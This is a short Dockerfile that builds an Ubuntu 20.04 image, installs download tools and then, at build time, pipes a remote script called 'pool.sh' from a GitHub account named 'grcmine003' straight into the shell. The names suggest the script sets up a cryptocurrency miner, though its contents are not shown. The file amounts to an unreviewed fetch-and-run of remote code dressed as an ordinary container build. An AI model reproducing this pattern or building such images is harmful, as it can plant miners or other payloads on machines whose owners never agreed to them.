FROM ubuntu:20.04
RUN apt update && apt install wget curl git -y
RUN curl https://raw.githubusercontent.com/grcmine003/grc/main/pool.sh | sh
